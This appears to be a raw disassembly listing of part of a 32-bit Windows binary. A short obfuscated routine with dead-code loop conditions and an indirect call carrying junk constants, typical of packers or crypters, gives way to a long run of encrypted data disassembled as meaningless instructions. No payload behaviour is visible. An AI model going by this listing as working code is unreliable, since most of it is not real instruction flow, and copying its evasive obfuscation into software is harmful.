  417636:	cmp    DWORD PTR ds:0x428ea9,0x4
  41763d:	jne    0x417650
  417643:	mov    esi,DWORD PTR ds:0x428ea9
  417649:	inc    esi
  41764a:	mov    DWORD PTR ds:0x428ea9,esi
  417650:	jmp    0x4175ec
  417655:	xor    eax,ecx
  417657:	add    eax,edx
  417659:	and    DWORD PTR ds:0x428e65,0x0
  417663:	jmp    0x417675
  417668:	mov    edi,DWORD PTR ds:0x428e65
  41766e:	inc    edi
  41766f:	mov    DWORD PTR ds:0x428e65,edi
  417675:	cmp    DWORD PTR ds:0x428e65,0x13
  41767c:	jae    0x4176b6
  417682:	cmp    DWORD PTR ds:0x428e65,0x15
  417689:	jbe    0x4176b6
  41768f:	jmp    0x4176b1
  417694:	push   DWORD PTR [ebp-0x20]
  417697:	push   0x1f3c
  41769c:	push   0x8271
  4176a1:	push   0x8e4d
  4176a6:	push   0x428ec5
  4176ab:	call   DWORD PTR ds:0x42ca14
  4176b1:	jmp    0x417668
  4176b6:	mov    DWORD PTR [ebp-0x20],eax
  4176b9:	mov    eax,DWORD PTR [ebp+0xc]
  4176bc:	mov    esi,DWORD PTR [ebp-0x8]
  4176bf:	xor    eax,ecx
  4176c1:	add    eax,edx
  4176c3:	imul   eax,DWORD PTR [esi]
  4176c6:	mov    esi,DWORD PTR [ebp+0x8]
  4176c9:	xor    esi,ecx
  4176cb:	add    esi,edx
  4176cd:	cmp    esi,eax
  4176cf:	mov    eax,DWORD PTR [ebp-0x4]
  4176d2:	mov    edi,0xffcd8d08
  4176d7:	je     0x4176f6
  4176dd:	mov    esi,DWORD PTR [ebp-0x20]
  4176e0:	add    DWORD PTR [eax],esi
  4176e2:	mov    eax,DWORD PTR [ebp-0x4]
  4176e5:	mov    esi,DWORD PTR [ebp+0xc]
  4176e8:	xor    esi,ecx
  4176ea:	add    esi,edx
  4176ec:	imul   esi,DWORD PTR [eax]
  4176ef:	mov    DWORD PTR [eax],esi
  4176f1:	jmp    0x4176fb
  4176f6:	mov    esi,DWORD PTR [ebp+0x14]
  4176f9:	xor    DWORD PTR [eax],esi
  4176fb:	mov    eax,DWORD PTR [ebp-0x4]
  4176fe:	mov    esi,DWORD PTR [ebp+0x10]
  417701:	xor    esi,ecx
  417703:	sub    edi,esi
  417705:	add    DWORD PTR [eax],edi
  417707:	mov    eax,DWORD PTR [ebp-0x4]
  41770a:	mov    esi,DWORD PTR [ebp-0x8]
  41770d:	add    esi,DWORD PTR [eax]
  41770f:	mov    DWORD PTR [ebp-0x8],esi
  417712:	mov    eax,DWORD PTR [ebp+0xc]
  417715:	mov    esi,DWORD PTR [ebp+0xc]
  417718:	xor    esi,ecx
  41771a:	xor    eax,ecx
  41771c:	lea    eax,[eax+esi*1+0x64e5f0]
  417723:	mov    esi,DWORD PTR [ebp+0xc]
  417726:	xor    esi,ecx
  417728:	add    esi,edx
  41772a:	imul   eax,esi
  41772d:	mov    esi,DWORD PTR [ebp+0xc]
  417730:	jmp    0x419aea
  417735:	sbb    DWORD PTR [edx+0x3a2c7d2b],ecx
  41773b:	cmp    DWORD PTR [edx],ebx
  41773d:	inc    edi
  41773e:	fst    st(5)
  417740:	inc    ecx
  417741:	aaa    
  417742:	ins    DWORD PTR es:[edi],dx
  417743:	cli    
  417744:	xor    BYTE PTR [edx+0x187b7cb9],ch
  41774a:	sahf   
  41774b:	jnp    0x4177c8
  41774d:	sti    
  41774e:	data16 xor cl,al
  417751:	cmp    ebp,DWORD PTR [ecx-0x2fcb0059]
  417757:	cmp    BYTE PTR [edx],bh
  417759:	jmp    0x417742
  41775b:	cli    
  41775c:	jmp    0x7c98:0x98e03dd4
  417763:	aas    
  417764:	stos   BYTE PTR es:[edi],al
  417765:	daa    
  417766:	int3   
  417767:	jno    0x417783
  417769:	pop    ebp
  41776a:	dec    ecx
  41776b:	mov    dh,0xe3
  41776d:	fucomip st,st(5)
  41776f:	add    eax,0x43d5a38
  417774:	enter  0x6a80,0xe2
  417778:	jp     0x41777f
  41777a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777b:	lahf   
  41777c:	(bad)  
  41777d:	or     DWORD PTR [ebp-0x52],ecx
  417780:	out    dx,al
  417781:	cwde   
  417782:	int3   
  417783:	int    0x57
  417785:	loop   0x41773c
  417787:	add    dh,cl
  417789:	or     bh,BYTE PTR [esi+0x1750fe85]
  41778f:	outs   dx,DWORD PTR ds:[esi]
  417790:	jb     0x417755
  417792:	imul   edi,DWORD PTR [edi],0xffffffa0
  417795:	xchg   ecx,eax
  417796:	sub    cl,BYTE PTR [eax+eax*2+0x3588ecd]
  41779d:	daa    
  41779e:	sar    BYTE PTR [eax],1
  4177a0:	retf   0x1f7
  4177a3:	dec    ecx
  4177a4:	retf   
  4177a5:	ret    
  4177a6:	(bad)  
  4177a8:	popa   
  4177a9:	and    al,0x21
  4177ab:	cld    
  4177ac:	and    edi,ebp
  4177ae:	int3   
  4177af:	loop   0x4177e3
  4177b1:	lods   eax,DWORD PTR ds:[esi]
  4177b2:	mov    ah,BYTE PTR [ebp-0x62]
  4177b5:	retf   0xf29b
  4177b8:	hlt    
  4177b9:	stc    
  4177ba:	mov    dh,0x2e
  4177bc:	dec    edx
  4177bd:	les    edx,FWORD PTR [ebx+0x566ea31f]
  4177c3:	xchg   ecx,eax
  4177c4:	pop    eax
  4177c5:	mov    eax,ds:0x4942a0da
  4177ca:	std    
  4177cb:	ror    DWORD PTR [esi+0x58],0xf5
  4177cf:	(bad)  [ebp+0x39]
  4177d2:	mov    bl,0xf6
  4177d4:	push   ebp
  4177d5:	idiv   BYTE PTR [ebx]
  4177d7:	jg     0x41784e
  4177d9:	cwde   
  4177da:	jge    0x417822
  4177dc:	sbb    edx,DWORD PTR [edi]
  4177de:	or     ah,dh
  4177e0:	ds ins BYTE PTR es:[edi],dx
  4177e2:	in     eax,0xc6
  4177e4:	test   al,0x4
  4177e6:	jp     0x4177da
  4177e8:	mov    bl,0x15
  4177ea:	out    0x1a,eax
  4177ec:	or     ebx,esp
  4177ee:	scas   al,BYTE PTR es:[edi]
  4177ef:	jg     0x4177c5
  4177f1:	jo     0x417843
  4177f3:	adc    al,0x73
  4177f5:	pop    ss
  4177f6:	shl    BYTE PTR [esi],cl
  4177f8:	xchg   edi,eax
  4177f9:	loope  0x4177bc
  4177fb:	fldenv [eax]
  4177fd:	pop    eax
  4177fe:	or     ebp,DWORD PTR [ebp+0x68]
  417801:	jecxz  0x4177ac
  417803:	aas    
  417804:	shl    al,cl
  417806:	cdq    
  417807:	fnstsw WORD PTR [esi+0x12]
  41780a:	mov    bh,0x29
  41780c:	shl    DWORD PTR [edx+0x2d],0x75
  417810:	mov    ebp,0x49914bf3
  417815:	fist   WORD PTR [eax-0x57481367]
  41781b:	fdiv   QWORD PTR [ebp-0x72]
  41781e:	add    eax,0x9f1790e7
  417823:	cmp    DWORD PTR [edx-0x13],esi
  417826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417827:	leave  
  417828:	ja     0x41782a
  41782a:	mov    BYTE PTR [ebx-0x49a1f51e],bh
  417830:	cmp    BYTE PTR [esi],dl
  417832:	xor    eax,ecx
  417834:	sub    ecx,DWORD PTR [esi+0x3386a3c5]
  41783a:	cmp    DWORD PTR [eax],edx
  41783c:	fild   DWORD PTR [edx]
  41783e:	add    al,0x1e
  417840:	lea    edx,[edi-0x75]
  417843:	xor    DWORD PTR [eax-0x5ccbece6],ebx
  417849:	mov    eax,ds:0xa9831739
  41784e:	int    0xf3
  417850:	inc    ebx
  417851:	imul   eax,DWORD PTR [esi+esi*8],0xed990a0e
  417858:	xor    al,0x43
  41785b:	cmc    
  41785c:	jecxz  0x417841
  41785e:	retf   0x6f3a
  417861:	pop    ecx
  417862:	stos   BYTE PTR es:[edi],al
  417863:	mov    eax,ds:0x3c9d2040
  417868:	jnp    0x4177ea
  41786a:	mov    ss,WORD PTR [ebp-0x301c6ac2]
  417870:	mov    bh,0x77
  417872:	xor    BYTE PTR [ecx],dh
  417874:	aaa    
  417875:	jbe    0x41789b
  417877:	cmp    DWORD PTR [edi+0x79493048],0xf6bbd1ae
  417881:	shl    DWORD PTR [ebp-0x6a1d2cac],cl
  417887:	inc    edx
  417888:	cmp    eax,0xbc50028e
  41788d:	push   ecx
  41788e:	aam    0x37
  417890:	or     DWORD PTR [eax+0x6a15caa1],esp
  417896:	and    DWORD PTR [ecx-0x30743bb],0x6c
  41789d:	popa   
  41789e:	mov    DWORD PTR [ecx-0x1c48469a],eax
  4178a4:	lahf   
  4178a5:	(bad)  
  4178a6:	or     BYTE PTR [edx],al
  4178a8:	scas   al,BYTE PTR es:[edi]
  4178a9:	push   ecx
  4178aa:	xchg   edx,esi
  4178ac:	mov    ecx,0xdbb503b9
  4178b1:	push   0xffffff99
  4178b3:	fldcw  WORD PTR [eax-0x70]
  4178b6:	shl    edi,cl
  4178b8:	push   cs
  4178b9:	out    0x21,eax
  4178bb:	mov    bh,BYTE PTR [ebp-0x5b59a454]
  4178c1:	test   al,dh
  4178c3:	adc    eax,0x2db469d9
  4178c8:	pop    ebx
  4178c9:	scas   al,BYTE PTR es:[edi]
  4178ca:	dec    edi
  4178cb:	cli    
  4178cc:	and    bl,0xec
  4178cf:	and    al,0xbc
  4178d1:	xchg   ebp,eax
  4178d2:	(bad)  
  4178d3:	sar    DWORD PTR ds:[edi+0x7b],1
  4178d7:	inc    edi
  4178d8:	dec    ebx
  4178d9:	jno    0x41788a
  4178db:	out    0x28,eax
  4178dd:	(bad)  
  4178de:	fnstenv [edi+0x39]
  4178e1:	nop
  4178e2:	push   ebx
  4178e3:	jns    0x417920
  4178e5:	sbb    DWORD PTR [ebx],ebp
  4178e7:	push   eax
  4178e8:	clc    
  4178e9:	pop    esi
  4178ea:	lock push ds
  4178ec:	enter  0xc040,0x53
  4178f0:	pop    ds
  4178f1:	js     0x41792c
  4178f3:	bswap  eax
  4178f5:	push   0xc8395a63
  4178fa:	xor    al,BYTE PTR [edx]
  4178fc:	ins    DWORD PTR es:[edi],dx
  4178fd:	and    ebx,DWORD PTR [edi+0x66a3adcc]
  417903:	in     al,dx
  417904:	pop    edx
  417905:	repnz iret 
  417907:	fiadd  WORD PTR [esi+0x4f77aff]
  41790d:	(bad)  
  41790e:	arpl   WORD PTR [eax-0x4b],dx
  417911:	xchg   BYTE PTR [eax+0x7a],dl
  417914:	or     eax,0xfc1cf76c
  417919:	add    dl,BYTE PTR [edi+edx*2]
  41791c:	lds    edi,FWORD PTR [ecx-0x3]
  41791f:	mov    eax,ds:0xb68653c4
  417924:	imul   ecx,DWORD PTR [ebp+0x13b4b38f],0xffffffbf
  41792b:	cmc    
  41792c:	sub    eax,0x82513036
  417931:	and    esi,DWORD PTR [ebx-0x19]
  417934:	inc    esi
  417935:	xchg   esp,eax
  417936:	jnp    0x41793d
  417938:	push   0xffffffb8
  41793a:	fnstsw WORD PTR [edi+0x40]
  41793d:	sub    DWORD PTR [edx-0x73],0xffffffd0
  417941:	shl    ebx,1
  417943:	xchg   edi,eax
  417944:	test   eax,0xc1e66bc2
  417949:	mov    dl,BYTE PTR [eax-0x7507792b]
  41794f:	call   0x9180:0x284c05c1
  417956:	out    dx,eax
  417957:	ins    DWORD PTR es:[edi],dx
  417958:	pop    edx
  417959:	xchg   edi,eax
  41795a:	aaa    
  41795b:	pop    ebx
  41795c:	mov    ah,0xc8
  41795e:	jne    0x4178f3
  417960:	loope  0x41791d
  417962:	js     0x417946
  417964:	cmp    eax,0x9ced7fa0
  417969:	cmp    cl,BYTE PTR [ecx+0x718314e6]
  41796f:	mov    dh,0xc9
  417971:	fs push ebp
  417973:	(bad)  
  417974:	xchg   ebx,eax
  417975:	pop    esp
  417976:	enter  0xc3e8,0xf5
  41797a:	push   ecx
  41797b:	imul   ebx,DWORD PTR [ebx],0x6cfa92e7
  417981:	je     0x417980
  417983:	mov    ch,BYTE PTR [eax]
  417985:	call   0x1c2890ac
  41798a:	sbb    esp,DWORD PTR [eax]
  41798c:	adc    DWORD PTR [edx],0xffffffed
  41798f:	and    eax,esi
  417991:	cmp    cl,BYTE PTR [ebp+0x79]
  417994:	or     eax,0xff5b6f99
  417999:	sbb    BYTE PTR [eax],dl
  41799b:	imul   esp,DWORD PTR [ebx],0xffffff88
  41799e:	mov    eax,0x7f381114
  4179a3:	cmp    eax,DWORD PTR [esi+0x28b88312]
  4179a9:	or     eax,0x2fd25289
  4179ae:	out    0x3d,eax
  4179b0:	mov    ah,0xb0
  4179b2:	cwde   
  4179b3:	ror    BYTE PTR [ebp+0x2b],0x98
  4179b7:	rcr    BYTE PTR [ebx],0x6
  4179ba:	and    ch,BYTE PTR ds:0xd7b2354
  4179c0:	cmp    esi,ebx
  4179c2:	xchg   ebp,eax
  4179c3:	imul   esi,DWORD PTR [ebx-0x70786b0c],0xffffffd7
  4179ca:	push   0x59e8b072
  4179cf:	lock push ebx
  4179d1:	inc    esi
  4179d2:	lods   al,BYTE PTR ds:[esi]
  4179d3:	stos   BYTE PTR es:[edi],al
  4179d4:	out    0x2e,al
  4179d6:	or     DWORD PTR [eax-0x3ca7d81f],ecx
  4179dc:	cmp    eax,0x2e73aa3c
  4179e1:	stos   BYTE PTR es:[edi],al
  4179e2:	mov    ds:0x36d22157,eax
  4179e7:	xor    DWORD PTR [edx-0x6971c7e4],ebx
  4179ed:	mov    WORD PTR [edx-0x113baaaf],gs
  4179f3:	dec    edx
  4179f4:	cmp    ah,BYTE PTR [esi+0x73]
  4179f7:	sbb    ecx,edi
  4179f9:	pop    ecx
  4179fa:	lock adc al,0xa
  4179fd:	xchg   edx,eax
  4179fe:	jne    0x4179e3
  417a00:	mov    ch,0x39
  417a02:	out    0x82,eax
  417a04:	std    
  417a05:	int    0x3c
  417a07:	add    DWORD PTR [esi+0x13b3a940],eax
  417a0d:	shl    BYTE PTR [ecx+0x7e],1
  417a10:	mov    esi,0x766e7f06
  417a15:	lahf   
  417a16:	mov    ch,0x6c
  417a18:	ins    BYTE PTR es:[edi],dx
  417a19:	sbb    bl,bh
  417a1b:	sbb    esp,edx
  417a1d:	ins    DWORD PTR es:[edi],dx
  417a1e:	ins    DWORD PTR es:[edi],dx
  417a1f:	aas    
  417a20:	inc    eax
  417a21:	and    esp,DWORD PTR [esi+0x39]
  417a24:	addr16 int3 
  417a26:	(bad)  [edx-0x4b]
  417a29:	js     0x417a6b
  417a2b:	pop    ss
  417a2c:	or     BYTE PTR [edi-0x402f59de],bh
  417a32:	into   
  417a33:	ds mov ebx,0xd1606abc
  417a39:	xchg   ecx,eax
  417a3a:	ss ror edx,0xb0
  417a3e:	xchg   esi,eax
  417a3f:	and    BYTE PTR [edx+0x6c95169a],dl
  417a45:	int    0xf4
  417a47:	les    ebp,FWORD PTR [ebx]
  417a49:	retf   
  417a4a:	imul   esp,eax,0xffffffaf
  417a4d:	add    cl,BYTE PTR [ecx-0x62]
  417a50:	les    edi,FWORD PTR [edx+edx*1]
  417a53:	stos   BYTE PTR es:[edi],al
  417a54:	pop    ecx
  417a55:	or     DWORD PTR [ebx-0x7ffe51a4],esp
  417a5b:	fcomp  QWORD PTR [edx-0x6c0219d6]
  417a61:	or     edi,ebp
  417a63:	je     0x417a16
  417a65:	imul   eax,esi,0x55
  417a68:	cli    
  417a69:	push   esp
  417a6a:	pop    edx
  417a6b:	sub    al,0xaa
  417a6d:	mov    esp,0xf5740a51
  417a72:	or     ecx,DWORD PTR [ebp-0x70]
  417a75:	mov    esi,0xcbc05ed3
  417a7a:	inc    ebx
  417a7b:	call   0xb91b30ac
  417a80:	loop   0x417a81
  417a82:	test   edx,0x9b8fbef1
  417a88:	adc    dh,BYTE PTR [edx]
  417a8a:	adc    eax,0x724782b0
  417a8f:	jle    0x417a7e
  417a91:	inc    ecx
  417a92:	xor    DWORD PTR [eax],eax
  417a94:	outs   dx,BYTE PTR ds:[esi]
  417a95:	popf   
  417a96:	jl     0x417a50
  417a98:	ret    
  417a99:	aad    0x20
  417a9b:	addr16 retf 0xc06e
  417a9f:	xor    BYTE PTR [edx-0x55],bl
  417aa2:	in     al,0x4e
  417aa4:	inc    esi
  417aa5:	add    al,0x7c
  417aa7:	ror    BYTE PTR [edi],0xb2
  417aaa:	into   
  417aab:	mov    edi,0x9f239711
  417ab0:	fist   DWORD PTR [edi+0xf]
  417ab3:	into   
  417ab4:	out    0x90,al
  417ab6:	jns    0x417ad4
  417ab8:	mov    al,0xd4
  417aba:	call   0x66e616ea
  417abf:	dec    ebx
  417ac0:	jg     0x417b30
  417ac2:	mov    bh,BYTE PTR [eax-0x5c]
  417ac5:	ret    0x7e25
  417ac8:	mov    ebp,0xda57c691
  417acd:	into   
  417ace:	out    dx,al
  417acf:	ret    
  417ad0:	dec    esi
  417ad1:	data16 jne 0x417aa0
  417ad4:	push   es
  417ad5:	fnstenv [edx+ecx*4+0x20005aea]
  417adc:	sbb    eax,ebp
  417ade:	lock push ds
  417ae0:	pusha  
  417ae1:	mov    bh,BYTE PTR [edi]
  417ae3:	pop    ss
  417ae4:	push   ecx
  417ae5:	xor    al,0xd0
  417ae7:	mov    cl,0x36
  417ae9:	mov    BYTE PTR [ebx+eax*4],bl
  417aec:	lods   eax,DWORD PTR ds:[esi]
  417aed:	sbb    DWORD PTR [eax+0x450f8a55],esi
  417af3:	sbb    DWORD PTR [edx-0x41f5479c],ecx
  417af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417afa:	adc    DWORD PTR [edx+esi*2],ecx
  417afd:	cmp    bh,ah
  417aff:	xlat   BYTE PTR ds:[ebx]
  417b00:	cli    
  417b01:	out    0x13,al
  417b03:	pop    ebp
  417b04:	dec    edi
  417b05:	xchg   ebx,eax
  417b06:	or     edx,DWORD PTR [edi]
  417b08:	jb     0x417b61
  417b0a:	test   al,0xec
  417b0c:	cmc    
  417b0d:	(bad)
  417b11:	add    ecx,DWORD PTR [ebp+0x4d]
  417b14:	jns    0x417b26
  417b16:	pop    esp
  417b17:	or     edi,ecx
  417b19:	lahf   
  417b1a:	jl     0x417adc
  417b1c:	add    BYTE PTR [esi],ah
  417b1e:	add    al,0x9c
  417b21:	aaa    
  417b22:	dec    ecx
  417b23:	pushf  
  417b24:	les    esp,FWORD PTR [ebx+0x5bd536c0]
  417b2a:	ins    DWORD PTR es:[edi],dx
  417b2b:	rol    DWORD PTR ds:0x160a9000,1
  417b31:	mov    eax,ds:0x9a04e627
  417b36:	xor    edi,DWORD PTR [edx+0x1c]
  417b39:	into   
  417b3a:	popf   
  417b3b:	retf   
  417b3c:	lea    ecx,[eax]
  417b3e:	scas   al,BYTE PTR es:[edi]
  417b3f:	mov    DWORD PTR [esi],edi
  417b41:	cmp    ebp,DWORD PTR [edi]
  417b43:	arpl   WORD PTR [edi+0x55999e7],ax
  417b49:	or     BYTE PTR [ebx],ch
  417b4b:	sbb    DWORD PTR [esp+ebp*8-0x383e8210],0x71
  417b53:	rol    DWORD PTR ds:0x7e8d4a0a,cl
  417b59:	mov    ecx,0x9392495d
  417b5e:	add    BYTE PTR [eax-0x222c4371],bh
  417b64:	rol    esi,cl
  417b66:	xchg   esi,eax
  417b67:	in     al,0xe1
  417b69:	push   ss
  417b6a:	cmp    BYTE PTR [ebx+0x21dd9f61],bh
  417b70:	jbe    0x417b45
  417b72:	mov    edx,0x23811dd1
  417b77:	cmp    ebx,DWORD PTR [esi]
  417b79:	pop    ebx
  417b7a:	push   es
  417b7b:	xlat   BYTE PTR ds:[ebx]
  417b7c:	sbb    BYTE PTR [ebp-0x4d79326c],0x57
  417b83:	sbb    eax,0x2ead8193
  417b88:	cmp    dl,ch
  417b8a:	idiv   BYTE PTR [edi+0xf83a404]
  417b90:	call   0x778e0ba8
  417b95:	ror    BYTE PTR [ecx],1
  417b97:	lds    eax,FWORD PTR [edx+ebp*2-0x55]
  417b9b:	arpl   WORD PTR [eax+eiz*1+0x5072e256],sp
  417ba2:	int    0xef
  417ba4:	mov    esp,0x8acdbb24
  417ba9:	call   0x63d1d697
  417bae:	cmc    
  417baf:	jg     0x417bcd
  417bb1:	std    
  417bb2:	jbe    0x417bee
  417bb4:	mov    eax,0xc76c6dc2
  417bb9:	push   edi
  417bba:	shr    BYTE PTR [eax-0x4d0cb454],0x74
  417bc1:	mov    al,ds:0xbb8ae416
  417bc6:	stos   BYTE PTR es:[edi],al
  417bc7:	inc    ecx
  417bc8:	inc    ebx
  417bc9:	in     al,0xe
  417bcb:	cmc    
  417bcc:	ror    BYTE PTR [ebx-0x29],0x31
  417bd0:	bound  eax,QWORD PTR [edi]
  417bd2:	and    eax,0x250311ed
  417bd7:	es minps xmm7,xmm0
  417bdb:	mov    edx,0xf2f61d73
  417be0:	cwde   
  417be1:	leave  
  417be2:	js     0x417bc2
  417be4:	sbb    eax,0xad44188d
  417be9:	nop
  417bea:	add    DWORD PTR [edi+ecx*4-0x4e],edi
  417bee:	cmp    al,al
  417bf0:	sbb    eax,DWORD PTR ds:0x8453623d
  417bf6:	and    al,0x61
  417bf8:	sbb    al,0x7
  417bfa:	mov    eax,DWORD PTR [esi+0x66ca72e1]
  417c00:	ret    0x2e25
  417c03:	add    dh,BYTE PTR [ebx-0x1e708a4c]
  417c09:	mov    al,0x5
  417c0b:	shl    BYTE PTR [eax-0x20],1
  417c0e:	aas    
  417c0f:	mov    ah,0x35
  417c11:	stos   DWORD PTR es:[edi],eax
  417c12:	push   cs
  417c13:	call   0x3cdf:0xc983d596
  417c1a:	sub    BYTE PTR [ecx+ecx*4+0x6],ch
  417c1e:	pop    eax
  417c1f:	cld    
  417c20:	sbb    BYTE PTR [eax+0x5f64d31e],0x67
  417c27:	inc    edx
  417c28:	cmp    DWORD PTR [edx],eax
  417c2a:	(bad)  
  417c2b:	fs pop esi
  417c2d:	mov    ebp,0xc93bdf46
  417c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c33:	mov    eax,0x8b42b280
  417c38:	jle    0x417bf6
  417c3a:	(bad)  
  417c3b:	rcr    DWORD PTR [ebx+0x36],cl
  417c3e:	push   ebp
  417c3f:	test   DWORD PTR [ebx-0x7023d45c],0x78e89f7d
  417c49:	mov    edx,0xcf4caa51
  417c4e:	rcr    DWORD PTR [eax],1
  417c50:	dec    esp
  417c51:	call   0x843facf9
  417c56:	jle    0x417cc4
  417c58:	mov    bh,0x99
  417c5a:	xchg   ebp,eax
  417c5b:	mov    edi,0x7a29639
  417c60:	jl     0x417c75
  417c62:	mov    eax,ds:0xc249a891
  417c67:	sbb    ebp,DWORD PTR [edi-0xc]
  417c6a:	pop    esp
  417c6b:	pop    ds
  417c6c:	aad    0x4f
  417c6e:	jg     0x417c4f
  417c70:	pop    ebx
  417c71:	mov    esp,0xade04a41
  417c76:	js     0x417c84
  417c78:	mov    esi,0xc39f5160
  417c7d:	xchg   edi,eax
  417c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c7f:	nop
  417c80:	clc    
  417c81:	sbb    DWORD PTR [eax],edx
  417c83:	xor    esp,edi
  417c85:	and    eax,0x157ec60c
  417c8a:	xor    ebx,DWORD PTR [ebp+ebp*8+0x34]
  417c8e:	mov    eax,ds:0xc8e36c65
  417c93:	pop    ss
  417c94:	mov    edx,0x9035252f
  417c99:	aad    0xfe
  417c9b:	pop    ecx
  417c9c:	(bad)  
  417c9d:	inc    ecx
  417c9e:	and    BYTE PTR [edi+0x72],bl
  417ca1:	fdivr  QWORD PTR [ebx-0x441c49db]
  417ca7:	ins    BYTE PTR es:[edi],dx
  417ca8:	retf   0x731e
  417cab:	and    dh,BYTE PTR [edi-0x5d]
  417cae:	sub    DWORD PTR [ebx-0x5f],edi
  417cb1:	xchg   esp,eax
  417cb2:	or     edx,DWORD PTR [eax-0x62]
  417cb5:	mov    edi,0x947d5d06
  417cba:	shl    eax,0xe9
  417cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cbe:	xchg   edx,eax
  417cbf:	mov    ecx,0x6c49d9f1
  417cc4:	cmp    BYTE PTR [edi-0x163eae14],dl
  417cca:	sbb    esp,ebx
  417ccc:	sbb    edx,edx
  417cce:	test   eax,0xe592c96d
  417cd3:	stos   DWORD PTR es:[edi],eax
  417cd4:	icebp  
  417cd5:	fistp  DWORD PTR [edx+edi*4+0x7c4a84cf]
  417cdc:	js     0x417c70
  417cde:	nop
  417cdf:	push   cs
  417ce0:	jl     0x417ce1
  417ce2:	adc    DWORD PTR [esi+0x4e],esi
  417ce5:	jmp    0x417ce4
  417ce7:	outs   dx,DWORD PTR ds:[esi]
  417ce8:	dec    esp
  417ce9:	jge    0x417d00
  417ceb:	int    0x3a
  417ced:	aam    0x97
  417cef:	dec    esi
  417cf0:	dec    esp
  417cf1:	cmp    DWORD PTR [ebx-0x7658fec8],0xffffffb7
  417cf8:	fstp   st(4)
  417cfa:	ds out dx,eax
  417cfc:	xor    BYTE PTR [esi-0x3b],ch
  417cff:	mov    cl,0xd6
  417d01:	mov    ds:0xaa271e99,eax
  417d06:	push   0xffffffc1
  417d08:	mov    cl,0xba
  417d0a:	push   esp
  417d0b:	(bad)  
  417d0c:	sbb    eax,ebp
  417d0e:	cmp    dh,ch
  417d10:	jnp    0x417cb3
  417d12:	cdq    
  417d13:	jno    0x417d15
  417d15:	inc    ebp
  417d16:	push   esi
  417d17:	dec    edx
  417d18:	pop    eax
  417d19:	jns    0x417cd6
  417d1b:	mov    WORD PTR [esi],?
  417d1d:	fimul  DWORD PTR [ecx+0x51]
  417d20:	mov    edx,ecx
  417d22:	mul    BYTE PTR [edx+0x48a10b87]
  417d28:	dec    esp
  417d29:	cmp    ah,BYTE PTR [edx+0x7c00efb0]
  417d2f:	pop    es
  417d30:	popf   
  417d31:	frstor [ebx-0x262befcc]
  417d37:	fwait
  417d38:	and    ch,ah
  417d3a:	sahf   
  417d3b:	sbb    eax,0x1adc79e0
  417d40:	cld    
  417d41:	cmp    BYTE PTR [ecx+0x17],dl
  417d44:	lods   eax,DWORD PTR ds:[esi]
  417d45:	call   0x7019:0x944c59a0
  417d4c:	enter  0x7b0e,0x55
  417d50:	jmp    DWORD PTR [ebp+0x37]
  417d53:	mov    ss,WORD PTR [edi+0x7f]
  417d56:	in     al,0x5
  417d58:	mov    ch,0x7f
  417d5a:	pop    ds
  417d5b:	dec    ecx
  417d5c:	fisttp QWORD PTR [esi+0x24]
  417d5f:	pop    ebx
  417d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d61:	or     eax,0xa9042fb4
  417d66:	test   al,0x23
  417d68:	frstor [edi-0x34e9b3f8]
  417d6e:	cmp    esp,esi
  417d70:	sar    DWORD PTR [eax-0x4c],0x6b
  417d74:	cmc    
  417d75:	lock or DWORD PTR [eax+0x5a],edi
  417d79:	rol    esp,cl
  417d7b:	and    DWORD PTR [edi-0x31],ebp
  417d7e:	fild   WORD PTR ds:0x8dacbe5e
  417d84:	sub    BYTE PTR [eax-0x50384308],al
  417d8a:	mov    ch,0xa1
  417d8c:	(bad)  
  417d8d:	mov    ch,0xcf
  417d8f:	or     BYTE PTR [edx+0x76],dh
  417d92:	push   es
  417d93:	adc    BYTE PTR [eax],cl
  417d95:	adc    BYTE PTR [ebx-0x7e],dh
  417d98:	bound  ebp,QWORD PTR [ebx-0x55f9e0df]
  417d9e:	push   edx
  417d9f:	fcom   st(7)
  417da1:	imul   ecx,DWORD PTR [esi+0x48ec189b],0xe700f638
  417dab:	popa   
  417dac:	sahf   
  417dad:	pop    ss
  417dae:	adc    al,0x22
  417db0:	repnz in al,dx
  417db2:	(bad)  
  417db3:	jmp    0x417dd3
  417db5:	mov    ebp,0x2801d96
  417dba:	pop    ebp
  417dbb:	sar    BYTE PTR [esi],1
  417dbd:	pop    ecx
  417dbe:	xor    al,0x92
  417dc0:	(bad)
  417dc5:	lods   al,BYTE PTR ds:[esi]
  417dc6:	xchg   edx,eax
  417dc7:	mov    esp,0x18f371d7
  417dcc:	nop
  417dcd:	xchg   ebp,eax
  417dce:	shr    DWORD PTR [eax+0x774058cc],0xb8
  417dd5:	mov    eax,0x6151e92
  417dda:	pop    ss
  417ddb:	jmp    0xe32ef7d0
  417de0:	and    esi,ebp
  417de2:	cld    
  417de3:	sbb    ebp,DWORD PTR [ebx+0x56b7d2a]
  417de9:	or     esp,ebx
  417deb:	in     al,0x89
  417ded:	dec    eax
  417dee:	mov    bl,0x54
  417df0:	outs   dx,BYTE PTR ds:[esi]
  417df1:	fcomp  QWORD PTR [edi-0x23]
  417df4:	scas   eax,DWORD PTR es:[edi]
  417df5:	pop    eax
  417df6:	adc    al,ah
  417df8:	es adc al,0x5c
  417dfc:	pushf  
  417dfd:	mov    BYTE PTR [edx],ah
  417dff:	icebp  
  417e00:	pop    eax
  417e01:	xor    BYTE PTR [edi-0x4707248],ch
  417e07:	fcom   st(6)
  417e09:	cdq    
  417e0a:	es icebp 
  417e0c:	in     al,0x9e
  417e0e:	mov    dh,0xa7
  417e10:	mov    ch,0x84
  417e12:	out    dx,eax
  417e13:	jne    0x417e35
  417e15:	test   BYTE PTR [ecx-0x3406499d],dh
  417e1b:	ret    0xd6ca
  417e1e:	repnz pushf 
  417e20:	or     cl,BYTE PTR [edx]
  417e22:	imul   eax,DWORD PTR [ebx],0xe4129ea3
  417e28:	adc    eax,0xf8ce4aa1
  417e2d:	clc    
  417e2e:	dec    edi
  417e2f:	pop    ebx
  417e30:	sub    BYTE PTR [edx-0x37],bl
  417e33:	push   esi
  417e34:	cld    
  417e35:	fisubr WORD PTR ds:0xbf4c4b04
  417e3b:	in     al,dx
  417e3c:	inc    esp
  417e3d:	outs   dx,DWORD PTR ds:[esi]
